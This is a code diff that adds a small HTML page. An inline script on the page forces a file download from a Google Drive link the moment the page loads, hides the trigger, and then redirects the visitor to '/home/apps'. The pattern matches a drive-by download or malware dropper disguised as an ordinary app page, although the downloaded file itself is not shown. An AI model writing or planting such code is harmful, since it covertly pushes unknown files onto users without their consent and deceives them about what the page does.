@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<script src="/js/config.js"></script>
+<script src="/js/session.js"></script>
+<script src="/js/logger.js"></script>
+<script src="/js/security.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/sparx.js"></script>
+</head>
+<body>
+<script>
+const a=document.createElement("a");
+a.href="https://drive.google.com/uc?export=download&id=1J8BQzrgaWp1VMaef8SQGW1Xci_zSRG7H";
+a.download="";
+document.body.appendChild(a);
+a.click();
+a.remove();
+setTimeout(()=>{
+    window.open("/home/apps","_self");
+},1000);
+</script>
+</body>
+</html>
